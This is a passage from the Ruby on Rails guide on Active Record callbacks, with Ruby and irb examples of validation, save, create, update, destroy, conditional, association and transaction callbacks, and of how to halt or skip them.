You can register the callbacks with a **macro-style class method that calls an
ordinary method** for implementation.

```ruby
class User < ApplicationRecord
  validates :username, :email, presence: true

  before_validation :ensure_username_has_value

  private
    def ensure_username_has_value
      if username.blank?
        self.username = email
      end
    end
end
```

The **macro-style class methods can also receive a block**. Consider using this
style if the code inside your block is so short that it fits in a single line:

```ruby
class User < ApplicationRecord
  validates :username, :email, presence: true

  before_validation do
    self.username = email if username.blank?
  end
end
```

Alternatively, you can **pass a proc to the callback** to be triggered.

```ruby
class User < ApplicationRecord
  validates :username, :email, presence: true

  before_validation ->(user) { user.username = user.email if user.username.blank? }
end
```

Lastly, you can define [**a custom callback object**](#callback-objects), as
shown below. We will cover these later in more detail.

```ruby
class User < ApplicationRecord
  validates :username, :email, presence: true

  before_validation AddUsername
end

class AddUsername
  def self.before_validation(record)
    if record.username.blank?
      record.username = record.email
    end
  end
end
```

### Registering Callbacks to Fire on Life Cycle Events

Callbacks can also be registered to only fire on certain life cycle events, this
can be done using the `:on` option and allows complete control over when and in
what context your callbacks are triggered.

NOTE: A context is like a category or a scenario in which you want certain
validations to apply. When you validate an ActiveRecord model, you can specify a
context to group validations. This allows you to have different sets of
validations that apply in different situations. In Rails, there are certain
default contexts for validations like :create, :update, and :save.

```ruby
class User < ApplicationRecord
  validates :username, :email, presence: true

  before_validation :ensure_username_has_value, on: :create

  # :on takes an array as well
  after_validation :set_location, on: [ :create, :update ]

  private
    def ensure_username_has_value
      if username.blank?
        self.username = email
      end
    end

    def set_location
      self.location = LocationService.query(self)
    end
end
```

NOTE: It is considered good practice to declare callback methods as private. If
left public, they can be called from outside of the model and violate the
principle of object encapsulation.

WARNING. Refrain from using methods like `update`, `save`, or any other methods
that cause side effects on the object within your callback methods. <br><br>
For instance, avoid calling `update(attribute: "value")` inside a callback. This
practice can modify the model's state and potentially lead to unforeseen side
effects during commit. <br><br> Instead, you can assign values directly (e.g.,
`self.attribute = "value"`) in `before_create`, `before_update`, or earlier
callbacks for a safer approach.

Available Callbacks
-------------------

Here is a list with all the available Active Record callbacks, listed **in the
order in which they will get called** during the respective operations:

### Creating an Object

* [`before_validation`][]
* [`after_validation`][]
* [`before_save`][]
* [`around_save`][]
* [`before_create`][]
* [`around_create`][]
* [`after_create`][]
* [`after_save`][]
* [`after_commit`][] / [`after_rollback`][]

See the [`after_commit` / `after_rollback`
section](active_record_callbacks.html#after-commit-and-after-rollback) for
examples using these two callbacks.

[`after_create`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-after_create
[`after_commit`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Transactions/ClassMethods.html#method-i-after_commit
[`after_rollback`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Transactions/ClassMethods.html#method-i-after_rollback
[`after_save`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-after_save
[`after_validation`]:
    https://api.rubyonrails.org/classes/ActiveModel/Validations/Callbacks/ClassMethods.html#method-i-after_validation
[`around_create`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-around_create
[`around_save`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-around_save
[`before_create`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-before_create
[`before_save`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-before_save
[`before_validation`]:
    https://api.rubyonrails.org/classes/ActiveModel/Validations/Callbacks/ClassMethods.html#method-i-before_validation

There are examples below that show how to use these callbacks. We've grouped
them by the operation they are associated with, and lastly show how they can be
used in combination.

#### Validation Callbacks

Validation callbacks are triggered whenever the record is validated directly via
the
[`valid?`](https://api.rubyonrails.org/classes/ActiveModel/Validations.html#method-i-valid-3F)
( or its alias
[`validate`](https://api.rubyonrails.org/classes/ActiveModel/Validations.html#method-i-validate))
or
[`invalid?`](https://api.rubyonrails.org/classes/ActiveModel/Validations.html#method-i-invalid-3F)
method, or indirectly via `create`, `update`, or `save`. They are called before
and after the validation phase.

```ruby
class User < ApplicationRecord
  validates :name, presence: true
  before_validation :titleize_name
  after_validation :log_errors

  private
    def titleize_name
      self.name = name.downcase.titleize if name.present?
      Rails.logger.info("Name titleized to #{name}")
    end

    def log_errors
      if errors.any?
        Rails.logger.error("Validation failed: #{errors.full_messages.join(', ')}")
      end
    end
end
```

```irb
irb> user = User.new(name: "", email: "john.doe@example.com", password: "abc123456")
=> #<User id: nil, email: "john.doe@example.com", created_at: nil, updated_at: nil, name: "">

irb> user.valid?
Name titleized to
Validation failed: Name can't be blank
=> false
```

#### Save Callbacks

Save callbacks are triggered whenever the record is persisted (i.e. "saved") to
the underlying database, via the `create`, `update`, or `save` methods. They are
called before, after, and around the object is saved.

```ruby
class User < ApplicationRecord
  before_save :hash_password
  around_save :log_saving
  after_save :update_cache

  private
    def hash_password
      self.password_digest = BCrypt::Password.create(password)
      Rails.logger.info("Password hashed for user with email: #{email}")
    end

    def log_saving
      Rails.logger.info("Saving user with email: #{email}")
      yield
      Rails.logger.info("User saved with email: #{email}")
    end

    def update_cache
      Rails.cache.write(["user_data", self], attributes)
      Rails.logger.info("Update Cache")
    end
end
```

```irb
irb> user = User.create(name: "Jane Doe", password: "password", email: "jane.doe@example.com")

Password hashed for user with email: jane.doe@example.com
Saving user with email: jane.doe@example.com
User saved with email: jane.doe@example.com
Update Cache
=> #<User id: 1, email: "jane.doe@example.com", created_at: "2024-03-20 16:02:43.685500000 +0000", updated_at: "2024-03-20 16:02:43.685500000 +0000", name: "Jane Doe">
```

#### Create Callbacks

Create callbacks are triggered whenever the record is persisted (i.e. "saved")
to the underlying database **for the first time** — in other words, when we're
saving a new record, via the `create` or `save` methods. They are called before,
after and around the object is created.

```ruby
class User < ApplicationRecord
  before_create :set_default_role
  around_create :log_creation
  after_create :send_welcome_email

  private
    def set_default_role
      self.role = "user"
      Rails.logger.info("User role set to default: user")
    end

    def log_creation
      Rails.logger.info("Creating user with email: #{email}")
      yield
      Rails.logger.info("User created with email: #{email}")
    end

    def send_welcome_email
      UserMailer.welcome_email(self).deliver_later
      Rails.logger.info("User welcome email sent to: #{email}")
    end
end
```

```irb
irb> user = User.create(name: "John Doe", email: "john.doe@example.com")

User role set to default: user
Creating user with email: john.doe@example.com
User created with email: john.doe@example.com
User welcome email sent to: john.doe@example.com
=> #<User id: 10, email: "john.doe@example.com", created_at: "2024-03-20 16:19:52.405195000 +0000", updated_at: "2024-03-20 16:19:52.405195000 +0000", name: "John Doe">
```

### Updating an Object

Update callbacks are triggered whenever an **existing** record is persisted
(i.e. "saved") to the underlying database. They are called before, after and
around the object is updated.

* [`before_validation`][]
* [`after_validation`][]
* [`before_save`][]
* [`around_save`][]
* [`before_update`][]
* [`around_update`][]
* [`after_update`][]
* [`after_save`][]
* [`after_commit`][] / [`after_rollback`][]

[`after_update`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-after_update
[`around_update`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-around_update
[`before_update`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-before_update

WARNING: The `after_save` callback is triggered on both create and update
operations. However, it consistently executes after the more specific callbacks
`after_create` and `after_update`, regardless of the sequence in which the macro
calls were made. Similarly, before and around save callbacks follow the same
rule: `before_save` runs before create/update, and `around_save` runs around
create/update operations. It's important to note that save callbacks will always
run before/around/after the more specific create/update callbacks.

We've already covered [validation](#validation-callbacks) and
[save](#save-callbacks) callbacks. See the [`after_commit` /
`after_rollback` section](#after-commit-and-after-rollback) for examples using
these two callbacks.

#### Update Callbacks

```ruby
class User < ApplicationRecord
  before_update :check_role_change
  around_update :log_updating
  after_update :send_update_email

  private
    def check_role_change
      if role_changed?
        Rails.logger.info("User role changed to #{role}")
      end
    end

    def log_updating
      Rails.logger.info("Updating user with email: #{email}")
      yield
      Rails.logger.info("User updated with email: #{email}")
    end

    def send_update_email
      UserMailer.update_email(self).deliver_later
      Rails.logger.info("Update email sent to: #{email}")
    end
end
```

```irb
irb> user = User.find(1)
=> #<User id: 1, email: "john.doe@example.com", created_at: "2024-03-20 16:19:52.405195000 +0000", updated_at: "2024-03-20 16:19:52.405195000 +0000", name: "John Doe", role: "user" >

irb> user.update(role: "admin")
User role changed to admin
Updating user with email: john.doe@example.com
User updated with email: john.doe@example.com
Update email sent to: john.doe@example.com
```

#### Using a Combination of Callbacks

Often, you will need to use a combination of callbacks to achieve the desired
behavior. For example, you may want to send a confirmation email after a user is
created, but only if the user is new and not being updated. When a user is
updated, you may want to notify an admin if critical information is changed. In
this case, you can use `after_create` and `after_update` callbacks together.

```ruby
class User < ApplicationRecord
  after_create :send_confirmation_email
  after_update :notify_admin_if_critical_info_updated

  private
    def send_confirmation_email
      UserMailer.confirmation_email(self).deliver_later
      Rails.logger.info("Confirmation email sent to: #{email}")
    end

    def notify_admin_if_critical_info_updated
      if saved_change_to_email? || saved_change_to_phone_number?
        AdminMailer.user_critical_info_updated(self).deliver_later
        Rails.logger.info("Notification sent to admin about critical info update for: #{email}")
      end
    end
end
```

```irb
irb> user = User.create(name: "John Doe", email: "john.doe@example.com")
Confirmation email sent to: john.doe@example.com
=> #<User id: 1, email: "john.doe@example.com", ...>

irb> user.update(email: "john.doe.new@example.com")
Notification sent to admin about critical info update for: john.doe.new@example.com
=> true
```

### Destroying an Object

Destroy callbacks are triggered whenever a record is destroyed, but ignored when
a record is deleted. They are called before, after and around the object is
destroyed.

* [`before_destroy`][]
* [`around_destroy`][]
* [`after_destroy`][]
* [`after_commit`][] / [`after_rollback`][]

[`after_destroy`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-after_destroy
[`around_destroy`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-around_destroy
[`before_destroy`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-before_destroy

Find [examples for using `after_commit` /
`after_rollback`](#after-commit-and-after-rollback).

#### Destroy Callbacks

```ruby
class User < ApplicationRecord
  before_destroy :check_admin_count
  around_destroy :log_destroy_operation
  after_destroy :notify_users

  private
    def check_admin_count
      if admin? && User.where(role: "admin").count == 1
        throw :abort
      end
      Rails.logger.info("Checked the admin count")
    end

    def log_destroy_operation
      Rails.logger.info("About to destroy user with ID #{id}")
      yield
      Rails.logger.info("User with ID #{id} destroyed successfully")
    end

    def notify_users
      UserMailer.deletion_email(self).deliver_later
      Rails.logger.info("Notification sent to other users about user deletion")
    end
end
```

```irb
irb> user = User.find(1)
=> #<User id: 1, email: "john.doe@example.com", created_at: "2024-03-20 16:19:52.405195000 +0000", updated_at: "2024-03-20 16:19:52.405195000 +0000", name: "John Doe", role: "admin">

irb> user.destroy
Checked the admin count
About to destroy user with ID 1
User with ID 1 destroyed successfully
Notification sent to other users about user deletion
```

### `after_initialize` and `after_find`

Whenever an Active Record object is instantiated, either by directly using `new`
or when a record is loaded from the database, the [`after_initialize`][]
callback will be called. It can be useful to avoid the need to directly override
your Active Record `initialize` method.

When loading a record from the database the [`after_find`][] callback will be
called. `after_find` is called before `after_initialize` if both are defined.

NOTE: The `after_initialize` and `after_find` callbacks have no `before_*`
counterparts.

They can be registered just like the other Active Record callbacks.

```ruby
class User < ApplicationRecord
  after_initialize do |user|
    Rails.logger.info("You have initialized an object!")
  end

  after_find do |user|
    Rails.logger.info("You have found an object!")
  end
end
```

```irb
irb> User.new
You have initialized an object!
=> #<User id: nil>

irb> User.first
You have found an object!
You have initialized an object!
=> #<User id: 1>
```

[`after_find`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-after_find
[`after_initialize`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-after_initialize

### `after_touch`

The [`after_touch`][] callback will be called whenever an Active Record object
is touched. You can [read more about `touch` in the API
docs](https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-touch).

```ruby
class User < ApplicationRecord
  after_touch do |user|
    Rails.logger.info("You have touched an object")
  end
end
```

```irb
irb> user = User.create(name: "Kuldeep")
=> #<User id: 1, name: "Kuldeep", created_at: "2013-11-25 12:17:49", updated_at: "2013-11-25 12:17:49">

irb> user.touch
You have touched an object
=> true
```

It can be used along with `belongs_to`:

```ruby
class Book < ApplicationRecord
  belongs_to :library, touch: true
  after_touch do
    Rails.logger.info("A Book was touched")
  end
end

class Library < ApplicationRecord
  has_many :books
  after_touch :log_when_books_or_library_touched

  private
    def log_when_books_or_library_touched
      Rails.logger.info("Book/Library was touched")
    end
end
```

```irb
irb> book = Book.last
=> #<Book id: 1, library_id: 1, created_at: "2013-11-25 17:04:22", updated_at: "2013-11-25 17:05:05">

irb> book.touch # triggers book.library.touch
A Book was touched
Book/Library was touched
=> true
```

[`after_touch`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Callbacks/ClassMethods.html#method-i-after_touch

Running Callbacks
-----------------

The following methods trigger callbacks:

* `create`
* `create!`
* `destroy`
* `destroy!`
* `destroy_all`
* `destroy_by`
* `save`
* `save!`
* `save(validate: false)`
* `save!(validate: false)`
* `toggle!`
* `touch`
* `update_attribute`
* `update_attribute!`
* `update`
* `update!`
* `valid?`
* `validate`

Additionally, the `after_find` callback is triggered by the following finder
methods:

* `all`
* `first`
* `find`
* `find_by`
* `find_by!`
* `find_by_*`
* `find_by_*!`
* `find_by_sql`
* `last`
* `sole`
* `take`

The `after_initialize` callback is triggered every time a new object of the
class is initialized.

NOTE: The `find_by_*` and `find_by_*!` methods are dynamic finders generated
automatically for every attribute. Learn more about them in the [Dynamic finders
section](active_record_querying.html#dynamic-finder-methods).

Conditional Callbacks
---------------------

As with [validations](active_record_validations.html), we can also make the
calling of a callback method conditional on the satisfaction of a given
predicate. We can do this using the `:if` and `:unless` options, which can take
a symbol, a `Proc` or an `Array`.

You may use the `:if` option when you want to specify under which conditions the
callback **should** be called. If you want to specify the conditions under which
the callback **should not** be called, then you may use the `:unless` option.

### Using `:if` and `:unless` with a `Symbol`

You can associate the `:if` and `:unless` options with a symbol corresponding to
the name of a predicate method that will get called right before the callback.

When using the `:if` option, the callback **won't** be executed if the predicate
method returns **false**; when using the `:unless` option, the callback
**won't** be executed if the predicate method returns **true**. This is the most
common option.

```ruby
class Order < ApplicationRecord
  before_save :normalize_card_number, if: :paid_with_card?
end
```

Using this form of registration it is also possible to register several
different predicates that should be called to check if the callback should be
executed. We will cover this in the [Multiple Callback Conditions
section](#multiple-callback-conditions).

### Using `:if` and `:unless` with a `Proc`

It is possible to associate `:if` and `:unless` with a `Proc` object. This
option is best suited when writing short validation methods, usually one-liners:

```ruby
class Order < ApplicationRecord
  before_save :normalize_card_number,
    if: ->(order) { order.paid_with_card? }
end
```

Since the proc is evaluated in the context of the object, it is also possible to
write this as:

```ruby
class Order < ApplicationRecord
  before_save :normalize_card_number, if: -> { paid_with_card? }
end
```

### Multiple Callback Conditions

The `:if` and `:unless` options also accept an array of procs or method names as
symbols:

```ruby
class Comment < ApplicationRecord
  before_save :filter_content,
    if: [:subject_to_parental_control?, :untrusted_author?]
end
```

You can easily include a proc in the list of conditions:

```ruby
class Comment < ApplicationRecord
  before_save :filter_content,
    if: [:subject_to_parental_control?, -> { untrusted_author? }]
end
```

### Using Both `:if` and `:unless`

Callbacks can mix both `:if` and `:unless` in the same declaration:

```ruby
class Comment < ApplicationRecord
  before_save :filter_content,
    if: -> { forum.parental_control? },
    unless: -> { author.trusted? }
end
```

The callback only runs when all the `:if` conditions and none of the `:unless`
conditions are evaluated to `true`.

Skipping Callbacks
------------------

Just as with [validations](active_record_validations.html), it is also possible
to skip callbacks by using the following methods:

* [`decrement!`][]
* [`decrement_counter`][]
* [`delete`][]
* [`delete_all`][]
* [`delete_by`][]
* [`increment!`][]
* [`increment_counter`][]
* [`insert`][]
* [`insert!`][]
* [`insert_all`][]
* [`insert_all!`][]
* [`touch_all`][]
* [`update_column`][]
* [`update_columns`][]
* [`update_all`][]
* [`update_counters`][]
* [`upsert`][]
* [`upsert_all`][]

Let's consider a `User` model where the `before_save` callback logs any changes
to the user's email address:

```ruby
class User < ApplicationRecord
  before_save :log_email_change

  private
    def log_email_change
      if email_changed?
        Rails.logger.info("Email changed from #{email_was} to #{email}")
      end
    end
end
```

Now, suppose there's a scenario where you want to update the user's email
address without triggering the `before_save` callback to log the email change.
You can use the `update_columns` method for this purpose:

```irb
irb> user = User.find(1)
irb> user.update_columns(email: 'new_email@example.com')
```

The above will update the user's email address without triggering the
`before_save` callback.

WARNING. These methods should be used with caution because there may be
important business rules and application logic in callbacks that you do not want
to bypass. Bypassing them without understanding the potential implications may
lead to invalid data.

[`decrement!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-decrement-21
[`decrement_counter`]:
    https://api.rubyonrails.org/classes/ActiveRecord/CounterCache/ClassMethods.html#method-i-decrement_counter
[`delete`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-delete
[`delete_all`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-delete_all
[`delete_by`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-delete_by
[`increment!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-increment-21
[`increment_counter`]:
    https://api.rubyonrails.org/classes/ActiveRecord/CounterCache/ClassMethods.html#method-i-increment_counter
[`insert`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-insert
[`insert!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-insert-21
[`insert_all`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-insert_all
[`insert_all!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-insert_all-21
[`touch_all`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-touch_all
[`update_column`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-update_column
[`update_columns`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-update_columns
[`update_all`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-update_all
[`update_counters`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-update_counters
[`upsert`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-upsert
[`upsert_all`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-upsert_all

Suppressing Saving
------------------

In certain scenarios, you may need to temporarily prevent records from being
saved within your callbacks.
This can be useful if you have a record with complex nested associations and want
to skip saving specific records during certain operations without permanently disabling
the callbacks or introducing complex conditional logic.

Rails provides a mechanism to prevent saving records using the
[`ActiveRecord::Suppressor` module](https://api.rubyonrails.org/classes/ActiveRecord/Suppressor.html).
By using this module, you can wrap a block of code where you want to avoid
saving records of a specific type that otherwise would be saved by the code block.

Let's consider a scenario where a user has many notifications.
Creating a `User` will automatically create a `Notification` record as well.

```ruby
class User < ApplicationRecord
  has_many :notifications

  after_create :create_welcome_notification

  def create_welcome_notification
    notifications.create(event: "sign_up")
  end
end

class Notification < ApplicationRecord
  belongs_to :user
end
```

To create a user without creating a notification, we can use the
ActiveRecord::Suppressor module as follows:

```ruby
Notification.suppress do
  User.create(name: "Jane", email: "jane@example.com")
end
```

In the above code, the `Notification.suppress` block ensures that the
`Notification` is not saved during the creation of the "Jane" user.

WARNING: Using the Active Record Suppressor can introduce complexity and
unexpected behavior. Suppressing saving can obscure the intended flow of your
application, leading to difficulties in understanding and maintaining the
codebase over time. Carefully consider the implications of using the suppressor,
ensuring thorough documentation and thoughtful testing to mitigate
risks of unintended side effects and test failures.

Halting Execution
-----------------

As you start registering new callbacks for your models, they will be queued for
execution. This queue will include all of your model's validations, the
registered callbacks, and the database operation to be executed.

The whole callback chain is wrapped in a transaction. If any callback raises an
exception, the execution chain gets halted and a **rollback** is issued, and the
error will be re-raised.

```ruby
class Product < ActiveRecord::Base
  before_validation do
    raise "Price can't be negative" if total_price < 0
  end
end

Product.create # raises "Price can't be negative"
```

This unexpectedly breaks code that does not expect methods like `create` and
`save` to raise exceptions.

NOTE: If an exception occurs during the callback chain, Rails will re-raise it
unless it is an `ActiveRecord::Rollback` or `ActiveRecord::RecordInvalid`
exception. Instead, you should use `throw :abort` to intentionally halt the
chain. If any callback throws `:abort`, the process will be aborted and `create`
will return false.

```ruby
class Product < ActiveRecord::Base
  before_validation do
    throw :abort if total_price < 0
  end
end

Product.create # => false
```

However, it will raise an `ActiveRecord::RecordNotSaved` when calling `create!`.
This exception indicates that the record was not saved due to the callback's
interruption.

```ruby
Product.create! # => raises an ActiveRecord::RecordNotSaved
```


When `throw :abort` is called in any destroy callback, `destroy` will return
false:

```ruby
class User < ActiveRecord::Base
  before_destroy do
    throw :abort if still_active?
  end
end

User.first.destroy # => false
```

However, it will raise an `ActiveRecord::RecordNotDestroyed` when calling
`destroy!`.

```ruby
User.first.destroy! # => raises an ActiveRecord::RecordNotDestroyed
```

Association Callbacks
---------------------

Association callbacks are similar to normal callbacks, but they are triggered by
events in the life cycle of the associated collection. There are four available
association callbacks:

* `before_add`
* `after_add`
* `before_remove`
* `after_remove`

You can define association callbacks by adding options to the association.

Suppose you have an example where an author can have many books. However, before
adding a book to the authors collection, you want to ensure that the author has
not reached their book limit. You can do this by adding a `before_add` callback
to check the limit.

```ruby
class Author < ApplicationRecord
  has_many :books, before_add: :check_limit

  private
    def check_limit(_book)
      if books.count >= 5
        errors.add(:base, "Cannot add more than 5 books for this author")
        throw(:abort)
      end
    end
end
```

If a `before_add` callback throws `:abort`, the object does not get added to the
collection.

At times you may want to perform multiple actions on the associated object. In
this case, you can stack callbacks on a single event by passing them as an
array. Additionally, Rails passes the object being added or removed to the
callback for you to use.

```ruby
class Author < ApplicationRecord
  has_many :books, before_add: [:check_limit, :calculate_shipping_charges]

  def check_limit(_book)
    if books.count >= 5
      errors.add(:base, "Cannot add more than 5 books for this author")
      throw(:abort)
    end
  end

  def calculate_shipping_charges(book)
    weight_in_pounds = book.weight_in_pounds || 1
    shipping_charges = weight_in_pounds * 2

    shipping_charges
  end
end
```

Similarly, if a `before_remove` callback throws `:abort`, the object does not
get removed from the collection.

NOTE: These callbacks are called only when the associated objects are added or
removed through the association collection.

```ruby
# Triggers `before_add` callback
author.books << book
author.books = [book, book2]

# Does not trigger the `before_add` callback
book.update(author_id: 1)
```

Cascading Association Callbacks
-------------------------------

Callbacks can be performed when associated objects are changed. They work
through the model associations whereby life cycle events can cascade on
associations and fire callbacks.

Suppose an example where a user has many articles. A user's articles should be
destroyed if the user is destroyed. Let's add an `after_destroy` callback to the
`User` model by way of its association to the `Article` model:

```ruby
class User < ApplicationRecord
  has_many :articles, dependent: :destroy
end

class Article < ApplicationRecord
  after_destroy :log_destroy_action

  def log_destroy_action
    Rails.logger.info("Article destroyed")
  end
end
```

```irb
irb> user = User.first
=> #<User id: 1>
irb> user.articles.create!
=> #<Article id: 1, user_id: 1>
irb> user.destroy
Article destroyed
=> #<User id: 1>
```

WARNING: When using a `before_destroy` callback, it should be placed before
`dependent: :destroy` associations (or use the `prepend: true` option), to
ensure they execute before the records are deleted by `dependent: :destroy`.

Transaction Callbacks
---------------------

### `after_commit` and `after_rollback`

Two additional callbacks are triggered by the completion of a database
transaction: [`after_commit`][] and [`after_rollback`][]. These callbacks are
very similar to the `after_save` callback except that they don't execute until
after database changes have either been committed or rolled back. They are most
useful when your Active Record models need to interact with external systems
that are not part of the database transaction.

Consider a `PictureFile` model that needs to delete a file after the
corresponding record is destroyed.

```ruby
class PictureFile < ApplicationRecord
  after_destroy :delete_picture_file_from_disk

  def delete_picture_file_from_disk
    if File.exist?(filepath)
      File.delete(filepath)
    end
  end
end
```

If anything raises an exception after the `after_destroy` callback is called and
the transaction rolls back, then the file will have been deleted and the model
will be left in an inconsistent state. For example, suppose that
`picture_file_2` in the code below is not valid and the `save!` method raises an
error.

```ruby
PictureFile.transaction do
  picture_file_1.destroy
  picture_file_2.save!
end
```

By using the `after_commit` callback we can account for this case.

```ruby
class PictureFile < ApplicationRecord
  after_commit :delete_picture_file_from_disk, on: :destroy

  def delete_picture_file_from_disk
    if File.exist?(filepath)
      File.delete(filepath)
    end
  end
end
```

NOTE: The `:on` option specifies when a callback will be fired. If you don't
supply the `:on` option the callback will fire for every life cycle event. [Read
more about `:on`](#registering-callbacks-to-fire-on-life-cycle-events).

When a transaction completes, the `after_commit` or `after_rollback` callbacks
are called for all models created, updated, or destroyed within that
transaction. However, if an exception is raised within one of these callbacks,
the exception will bubble up and any remaining `after_commit` or
`after_rollback` methods will _not_ be executed.

```ruby
class User < ActiveRecord::Base
  after_commit { raise "Intentional Error" }
  after_commit {
    # This won't get called because the previous after_commit raises an exception
    Rails.logger.info("This will not be logged")
  }
end
```

WARNING. If your callback code raises an exception, you'll need to rescue it and
handle it within the callback in order to allow other callbacks to run.

`after_commit` makes very different guarantees than `after_save`,
`after_update`, and `after_destroy`. For example, if an exception occurs in an
`after_save` the transaction will be rolled back and the data will not be
persisted.

```ruby
class User < ActiveRecord::Base
  after_save do
    # If this fails the user won't be saved.
    EventLog.create!(event: "user_saved")
  end
end
```

However, during `after_commit` the data was already persisted to the database,
and thus any exception won't roll anything back anymore.

```ruby
class User < ActiveRecord::Base
  after_commit do
    # If this fails the user was already saved.
    EventLog.create!(event: "user_saved")
  end
end
```

The code executed within `after_commit` or `after_rollback` callbacks is itself
not enclosed within a transaction.

In the context of a single transaction, if you represent the same record in the
database, there's a crucial behavior in the `after_commit` and `after_rollback`
callbacks to note. These callbacks are triggered only for the first object of
the specific record that changes within the transaction. Other loaded objects,
despite representing the same database record, will not have their respective
`after_commit` or `after_rollback` callbacks triggered.

```ruby
class User < ApplicationRecord
  after_commit :log_user_saved_to_db, on: :update

  private
    def log_user_saved_to_db
      Rails.logger.info("User was saved to database")
    end
end
```

```irb
irb> user = User.create
irb> User.transaction { user.save; user.save }
# User was saved to database
```

WARNING: This nuanced behavior is particularly impactful in scenarios where you
expect independent callback execution for each object associated with the same
database record. It can influence the flow and predictability of callback
sequences, leading to potential inconsistencies in application logic following
the transaction.

### Aliases for `after_commit`

Using the `after_commit` callback only on create, update, or destroy is common.
Sometimes you may also want to use a single callback for both `create` and
`update`. Here are some common aliases for these operations:

* [`after_destroy_commit`][]
* [`after_create_commit`][]
* [`after_update_commit`][]
* [`after_save_commit`][]

Let's go through some examples:

Instead of using `after_commit` with the `on` option for a destroy like below:

```ruby
class PictureFile < ApplicationRecord
  after_commit :delete_picture_file_from_disk, on: :destroy

  def delete_picture_file_from_disk
    if File.exist?(filepath)
      File.delete(filepath)
    end
  end
end
```

You can instead use the `after_destroy_commit`.

```ruby
class PictureFile < ApplicationRecord
  after_destroy_commit :delete_picture_file_from_disk

  def delete_picture_file_from_disk
    if File.exist?(filepath)
      File.delete(filepath)
    end
  end
end
```

The same applies for `after_create_commit` and `after_update_commit`.

However, if you use the `after_create_commit` and the `after_update_commit`
callback with the same method name, it will only allow the last callback defined
to take effect, as they both internally alias to `after_commit` which overrides
previously defined callbacks with the same method name.

```ruby
class User < ApplicationRecord
  after_create_commit :log_user_saved_to_db
  after_update_commit :log_user_saved_to_db

  private
    def log_user_saved_to_db
      # This only gets called once
      Rails.logger.info("User was saved to database")
    end
end
```

```irb
irb> user = User.create # prints nothing

irb> user.save # updating @user
User was saved to database
```

In this case, it's better to use `after_save_commit` instead which is an alias
for using the `after_commit` callback for both create and update:

```ruby
class User < ApplicationRecord
  after_save_commit :log_user_saved_to_db

  private
    def log_user_saved_to_db
      Rails.logger.info("User was saved to database")
    end
end
```

```irb
irb> user = User.create # creating a User
User was saved to database

irb> user.save # updating user
User was saved to database
```

### Transactional Callback Ordering

By default (from Rails 7.1), transaction callbacks will run in the order they
are defined.

```ruby
class User < ActiveRecord::Base
  after_commit { Rails.logger.info("this gets called first") }
  after_commit { Rails.logger.info("this gets called second") }
end
```

However, in prior versions of Rails, when defining multiple transactional
`after_` callbacks (`after_commit`, `after_rollback`, etc), the order in which
the callbacks were run was reversed.

If for some reason you'd still like them to run in reverse, you can set the
following configuration to `false`. The callbacks will then run in the reverse
order. See the [Active Record configuration
options](configuring.html#config-active-record-run-after-transaction-callbacks-in-order-defined)
for more details.

```ruby
config.active_record.run_after_transaction_callbacks_in_order_defined = false
```

NOTE: This applies to all `after_*_commit` variations too, such as
`after_destroy_commit`.

[`after_create_commit`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Transactions/ClassMethods.html#method-i-after_create_commit
[`after_destroy_commit`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Transactions/ClassMethods.html#method-i-after_destroy_commit
[`after_save_commit`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Transactions/ClassMethods.html#method-i-after_save_commit
[`after_update_commit`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Transactions/ClassMethods.html#method-i-after_update_commit

### Per transaction callback

You can also register transactional callbacks such as `before_commit`, `after_commit` and `after_rollback` on a specific transaction.
This is handy in situations where you need to perform an action that isn't specific to a model but rather a unit of work.

`ActiveRecord::Base.transaction` yields an `ActiveRecord::Transaction` object, which allows registering the said callbacks on it.

```ruby
Article.transaction do |transaction|
  article.update(published: true)

  transaction.after_commit do
    PublishNotificationMailer.with(article: article).deliver_later
  end
end
```

### `ActiveRecord.after_all_transactions_commit`

